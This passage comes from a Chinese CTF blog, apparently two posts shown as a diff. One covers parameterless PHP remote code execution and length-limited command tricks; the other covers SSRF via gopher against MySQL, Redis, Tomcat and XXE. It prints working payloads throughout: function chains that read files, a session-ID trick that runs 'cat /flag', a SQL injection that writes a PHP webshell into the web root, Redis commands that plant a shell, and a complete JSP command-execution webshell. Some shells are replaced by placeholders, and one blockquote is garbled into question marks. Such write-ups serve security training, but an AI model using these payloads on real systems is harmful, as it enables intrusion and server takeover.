:将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）</span><br><span class="line">localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）</span><br><span class="line">current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西</span><br><span class="line">getcwd() :取得当前工作目录</span><br><span class="line">dirname():函数返回路径中的目录部分</span><br><span class="line">array_flip() :交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand() :从数组中随机取出一个或多个单元</span><br><span class="line"></span><br><span class="line">array_reverse():将数组内容反转</span><br><span class="line"></span><br><span class="line">strrev():用于反转给定字符串</span><br><span class="line"></span><br><span class="line">getcwd()：获取当前工作目录路径</span><br><span class="line"></span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"></span><br><span class="line">hightlight_file()、show_source()、readfile()：读取文件内容</span><br><span class="line"></span><br><span class="line">举个例子scandir(&#x27;.&#x27;)是返回当前目录,虽然我们无法传参，但是由于localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看当前目录下文件的payload：</span><br><span class="line"></span><br><span class="line">?参数=var_dump(scandir(current(localeconv())));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="数组移动"><a href="#数组移动" class="headerlink" title="数组移动"></a>数组移动</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure>
+<h3 id="scandir-文件读取函数"><a href="#scandir-文件读取函数" class="headerlink" title="scandir()文件读取函数"></a>scandir()文件读取函数</h3><p>[GXYCTF 2019]禁止套娃<br>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"> 2 include &quot;flag.php&quot;;</span><br><span class="line"> 3 echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line"> 4 if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line"> 5     if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line"> 6         if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line"> 7             if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line"> 8                 // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">10             &#125;</span><br><span class="line">11             else&#123;</span><br><span class="line">12                 die(&quot;还差一点哦！&quot;);</span><br><span class="line">13             &#125;</span><br><span class="line">14         &#125;</span><br><span class="line">15         else&#123;</span><br><span class="line">16             die(&quot;再好好想想！&quot;);</span><br><span class="line">17         &#125;</span><br><span class="line">18     &#125;</span><br><span class="line">19     else&#123;</span><br><span class="line">20         die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">21     &#125;</span><br><span class="line">22 &#125;</span><br><span class="line">23 // highlight_file(__FILE__);</span><br><span class="line">24 ?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+<p><img src="/images/rce/pasted-image-20260215193238.png" alt="Pasted image 20260215193238"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+<p>通过读取倒数第二个得到flag</p>
+<p>或者</p>
+<blockquote>
+<p>array_rand(): 从数组中取出一个或者多个单元，并且返回随机条目的一个或者多个键。<br>array_flip()：读取当前目录的键和值进行交换，如果失败返回 NULL。</p>
+<p>array_flip()和array_rand()配合使用可随机返回当前目录下的文件名。因为其中的键可以利用随机数函数array_rand()，进行随机生成。</p>
+</blockquote>
+<p>payload:（多发几次，随机返回当前目录下的文件内容，会返回flag的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var=show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+
+<h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><p>使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p>
+<p>首先我们需要开启session_start()​来保证session_id()的使用，session_id​可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现<br>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$tgctf2025=$_GET[&#x27;tgctf2025&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;, $tgctf2025))&#123;</span><br><span class="line">    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?参数=session_start();system(hex2bin(session_id()));</span><br><span class="line">PHPSESSID=636174202f666c6167     //cat /flag的十六进制</span><br></pre></td></tr></table></figure>
+
+<h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</p>
+<p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p>
+<p>var_dump(end(getallheaders()));</p>
+<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><strong>特点</strong>：比getallheaders()更具普遍性，可获取所有全局变量。</p>
+<p><strong>工作原理</strong>：</p>
+<ul>
+<li>返回包含所有全局变量的数组，顺序为：<code>$_GET</code> → <code>$_POST</code> → <code>$_COOKIE</code> → <code>$_FILES</code></li>
+<li>通过操作这些变量，可以实现无参数RCE</li>
+</ul>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li>首先确认回显：<code>print_r(get_defined_vars())</code></li>
+<li>添加额外参数传递恶意代码：</li>
+</ol>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">  ```   </span><br><span class="line">3. 也可将eval替换为assert，同样能执行命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 长度限制 </span><br><span class="line">### 7</span><br><span class="line">![Pasted image 20260307070940](/images/rce/pasted-image-20260307070940.png)</span><br><span class="line"></span><br><span class="line">### 5</span><br><span class="line">![Pasted image 20260307072922](/images/rce/pasted-image-20260307072922.png)</span><br><span class="line">![Pasted image 20260307073739](/images/rce/pasted-image-20260307073739.png)</span><br><span class="line"></span><br><span class="line">### 4</span><br><span class="line">![Pasted image 20260307075126](/images/rce/pasted-image-20260307075126.png)</span><br><span class="line">![Pasted image 20260307075156](/images/rce/pasted-image-20260307075156.png)</span><br><span class="line">![Pasted image 20260307075620](/images/rce/pasted-image-20260307075620.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ：linux中的 &gt; 符号和 &gt;&gt; 符号</span><br><span class="line"></span><br><span class="line">1.通过&gt;来创建文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>test.txt<br>ls</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">2.通过&gt;将命令执行的结果存入文件中</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>echo “hello world”&gt;test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line">但是通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容，如果我们想要在原本文件内容后面追加内容就要使用&gt;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>echo “aaa”&gt;test<br>cat test<br>echo “bbb”&gt;&gt;test<br>cat test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### linux中命令换行</span><br><span class="line"></span><br><span class="line">在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 &quot;\&quot;，可以将一条命令写在多行  </span><br><span class="line">比如我们有一个test文件内容如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>ec<br>ho <br>hello <br>world!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后我们用sh命令来执行一下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>sh test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">成功输出了 hello world!</span><br><span class="line"></span><br><span class="line">### ls -t命令</span><br><span class="line"></span><br><span class="line">在linux中，我们使用ls -t命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>touch a<br>touch b<br>touch c<br>ls -t</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">结果c b a</span><br><span class="line">### 利用ls -t 和 &gt; 以及换行符 绕过长度限制执行命令</span><br><span class="line"></span><br><span class="line">我们先看执行如下命令的结果：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>ls -t&gt;test<br>cat test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">ls -t 命令列出文件名，然后每个文件名按行储存，如果我们将我们要执行的命令拆分为多个文件名，然后再结合命令换行，然后通过 ls -t &gt; test这样的方式再写入某个文件来运行不就可以绕过命令长度限制了吗，而且从上面我们可以看出，ls -t&gt;test的执行顺序是先创建文件test，然后执行ls -t，然后将执行结果写入test文件  </span><br><span class="line">我们可以做如下小实验：  </span><br><span class="line">比如我们要执行 echo hello world</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>“rld”<br>“wo\“<br>“llo \“<br>“he\“<br>“echo \“<br>ls -t &gt; _<br>sh _</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  最终成功的输出了 &quot;hello world</span><br><span class="line"></span><br><span class="line">## 软连接</span><br></pre></td></tr></table></figure>
+<h1 id="1-创建指向网站根目录的软链接"><a href="#1-创建指向网站根目录的软链接" class="headerlink" title="1. 创建指向网站根目录的软链接"></a>1. 创建指向网站根目录的软链接</h1><p>ln -s &#x2F;var&#x2F;www&#x2F;html www_link</p>
+<h1 id="2-压缩软链接（必须用-y-或-–symlinks）"><a href="#2-压缩软链接（必须用-y-或-–symlinks）" class="headerlink" title="2. 压缩软链接（必须用 -y 或 –symlinks）"></a>2. 压缩软链接（必须用 -y 或 –symlinks）</h1><p>zip -y slink.zip www_link</p>
+<h1 id="3-删除软链接，创建同名目录（用于第二步上传木马）"><a href="#3-删除软链接，创建同名目录（用于第二步上传木马）" class="headerlink" title="3. 删除软链接，创建同名目录（用于第二步上传木马）"></a>3. 删除软链接，创建同名目录（用于第二步上传木马）</h1><p>rm www_link<br>mkdir www_link<br><PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY></p>
+<h1 id="4-压缩目录（覆盖之前的软链接）"><a href="#4-压缩目录（覆盖之前的软链接）" class="headerlink" title="4. 压缩目录（覆盖之前的软链接）"></a>4. 压缩目录（覆盖之前的软链接）</h1><p>zip -r shell.zip www_link</p>
+<h1 id="5-先传-slink-zip，再传-shell-zip"><a href="#5-先传-slink-zip，再传-shell-zip" class="headerlink" title="5. 先传 slink.zip，再传 shell.zip"></a>5. 先传 slink.zip，再传 shell.zip</h1><h1 id="解压后-output-txt-实际落在-var-www-html-output-txt"><a href="#解压后-output-txt-实际落在-var-www-html-output-txt" class="headerlink" title="解压后 output.txt 实际落在 &#x2F;var&#x2F;www&#x2F;html&#x2F;output.txt"></a>解压后 output.txt 实际落在 &#x2F;var&#x2F;www&#x2F;html&#x2F;output.txt</h1><pre><code>
+</code></pre>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web??</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-SSRF" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2026/07/02/SSRF/" class="article-date">
+      <time datetime="2026-07-02T14:00:00.000Z" itemprop="datePublished">2026-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2026/07/02/SSRF/">SSRF</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>??????????????? CTF ??????????????<br>?????? PHP shell ???????????<code>&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br>?????? PHP payload ?????????<code>&lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br><code>shell.php</code> ??????? <code>output.txt</code>????????????????????</p>
+</blockquote>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>获取主机名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/hosts</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ssrf/pasted-image-20260316181233.png" alt="Pasted image 20260316181233"></p>
+<hr>
+<p><strong><a target="_blank" rel="noopener" href="http://172.250.250.3/?id=1%27%2520union%2520select%2520NULL,NULL,NULL,%27%3C?php%2520system($_GET%5B1%5D);%2520?%3E%27%2520INTO%2520DUMPFILE%2520%27/var/www/html/output.txt%27--%2520">http://172.250.250.3?id=1&#39;%2520union%2520select%2520NULL,NULL,NULL,&#39;%3C?php%2520system($_GET[1]);%2520?%3E&#39;%2520INTO%2520DUMPFILE%2520&#39;/var/www/html/output.txt&#39;--%2520</a></strong></p>
+<h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p><img src="/images/ssrf/pasted-image-20260313115858.png" alt="Pasted image 20260313115858"></p>
+<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><p>四个必须的参数即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=21ef36770f67a6ddf8809c5f14ab557f</span><br></pre></td></tr></table></figure>
+<p>1.url路径编码<br>2.二次编码，同时将<code>%0A</code>全部替换为<code>%0D%0A</code>。因为 Gopher协议包含的请求数据包中，可能包含有<code>=</code>、<code>&amp;</code>等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把<code>%</code>后的字节当做普通字节<br>3.最终完整url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-2cc48a18335efbf5.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253D21ef36770f67a6ddf8809c5f14ab557f</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>gopher协议记得在目标ip地址即host后面加一个占位符，不然会被吞掉第一个字符，推荐使用<code>_</code><br>{下划线}</p>
+</blockquote>
+<h2 id="SSRF之XXE"><a href="#SSRF之XXE" class="headerlink" title="SSRF之XXE"></a>SSRF之XXE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE user [ </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt; </span><br><span class="line">&lt;user&gt; </span><br><span class="line">    &lt;username&gt;&amp;xxe;&lt;/username&gt; </span><br><span class="line">    &lt;password&gt;admin&lt;/password&gt; </span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将其附加至正常抓包页面下同时删去 <code>Accept-Encoding</code> 这一行，再将整体进行双重url编码<br>接着构造gopher协议即可</p>
+<h2 id="SSRF之SQL注入"><a href="#SSRF之SQL注入" class="headerlink" title="SSRF之SQL注入"></a>SSRF之SQL注入</h2><p><img src="/images/ssrf/pasted-image-20260313124816.png" alt="Pasted image 20260313124816"><br>再将ip后两次url编码</p>
+<h2 id="SSRF之mysql"><a href="#SSRF之mysql" class="headerlink" title="SSRF之mysql"></a>SSRF之mysql</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql  #启动 Gopherus 工具</span><br><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select * from security.users #**执行的 SQL 语句**</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ssrf/pasted-image-20260313131110.png" alt="Pasted image 20260313131110"><br>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1d%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%73%65%63%75%72%69%74%79%2e%75%73%65%72%73%01%00%00%00%01</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SSRF之tomcat"><a href="#SSRF之tomcat" class="headerlink" title="SSRF之tomcat"></a>SSRF之tomcat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(command != null)</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        out.print(&quot;format: xxx.jsp?cmd=Command&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将其附加至你的抓包页面下，同时再将整体进行双重url编码<br>接着构造gopher协议即可<br><img src="/images/ssrf/pasted-image-20260314131310.png" alt="Pasted image 20260314131310"></p>
+<p><img src="/images/ssrf/pasted-image-20260314131324.png" alt="Pasted image 20260314131324"></p>
+<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><h3 id="未授权webshell写入"><a href="#未授权webshell写入" class="headerlink" title="未授权webshell写入"></a>未授权webshell写入</h3><p>1.虚拟机kali中</p>
+<ul>
+<li>cd ~&#x2F;桌面&#x2F;Gopherus</li>
+<li>启动攻击模块：python2 gopherus.py –exploit redis</li>
+<li>第一行输入攻击类型：PHPShell：生成一个 PHP WebShell 文件</li>
+<li><pre><code>                             ReverseShell：生成一个直接反弹 Shell 的 payload
+</code></pre>
+</li>
+<li>第二行输入路径:这个路径决定了 Redis 写入的恶意文件最终存储在服务器的哪个位置，需根据目标服务器的 Web 目录结构或可利用路径填写，才能让后续的恶意文件被有效访问和执行</li>
+<li><pre><code>                          /var/www/html
+</code></pre>
+</li>
+<li>第三行输入 WebShell 内容:<code>&lt;?=</code>$_GET[1]<code>?&gt;</code>Gopherus 会自动将 <code>dbfilename</code>（Redis 持久化文件名）设置为 <code>output.txt，配置完毕后</code>Gopherus 工具会根据输入生成相应的 Gopher 协议有效载荷<img src="/images/ssrf/pasted-image-20251212174234.png" alt="Pasted image 20251212174234"><br>2.再次编码后附加到url，显示此页面为504，没有关系，执行这段payload的目标就是在服务器根目录上传木马output.txt<br><img src="/images/ssrf/pasted-image-20251212174301.png" alt="Pasted image 20251212174301"><br>3.列出目录<br><img src="/images/ssrf/pasted-image-20251212174631.png" alt="Pasted image 20251212174631"><br>4.获取flag<br><img src="/images/ssrf/pasted-image-20251212174805.png" alt="Pasted image 20251212174805"></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">*1</span><br><span class="line">$7</span><br><span class="line">COMMAND</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">CONFIG</span><br><span class="line">$3</span><br><span class="line">SET</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$14</span><br><span class="line">/var/www/html/</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$8</span><br><span class="line">info.php</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$7</span><br><span class="line">payload</span><br><span class="line">$19</span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>每行都是以 <code>\r</code> 结尾的，但是 Redis 的协议是以 CRLF (<code>\r\n</code>) 结尾，所以转换的时候需要把 <code>\r</code> 转换为 <code>\r\n</code>，然后其他全部进行 两次 URL 编码</p>
